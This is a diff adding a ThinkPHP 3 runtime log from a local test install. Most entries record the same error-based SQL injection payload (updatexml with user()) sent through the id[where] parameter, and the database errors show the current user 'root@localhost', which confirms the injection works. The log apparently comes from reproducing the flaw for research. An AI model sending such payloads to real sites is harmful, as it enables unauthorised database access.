@@ -1,0 +1,216 @@
+[ 2019-07-18T17:13:44+08:00 ] ::1 /tp3/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000410s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003160s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001237s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002238s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000572s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000701s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000391s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000493s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000748s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000869s ]
+
+[ 2019-07-18T17:19:54+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000076s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001146s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001158s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001443s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0156s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:20:18+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000062s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000692s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000512s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000757s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:20:20+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000051s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000538s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000528s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000885s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0036s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:20:35+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000078s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000851s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000695s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000950s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0036s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:20:42+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000059s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000670s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000510s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000745s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:20:53+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000051s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000571s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000470s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000708s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0016s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:21:04+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000067s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000752s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000533s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000763s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0033s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:21:15+08:00 ] ::1 /tp3/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000052s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000554s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000470s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000710s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002463s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002846s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000731s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001184s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002085s ]
+INFO: [ app_end ] --END-- [ RunTime:0.002629s ]
+
+[ 2019-07-18T17:21:18+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000054s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000599s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000485s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000726s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0033s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:21:35+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000073s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000577s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000463s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000758s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0043s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:31:57+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000060s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000681s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000661s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000949s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0056s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T17:32:19+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000065s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000767s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000516s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000753s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0057s ]
+SQL: SELECT * FROM `user` WHERE 1 LIMIT 1   [ RunTime:0.0025s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001068s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001735s ]
+
+[ 2019-07-18T17:41:07+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000056s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000690s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000668s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000964s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0021s ]
+SQL: SELECT * FROM `user` WHERE 1 LIMIT 1   [ RunTime:0.0004s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004554s ]
+INFO: [ app_end ] --END-- [ RunTime:0.005148s ]
+
+[ 2019-07-18T18:17:08+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000065s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001814s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000874s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001127s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0048s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-18T18:24:11+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000053s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000659s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000484s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000724s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0039s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
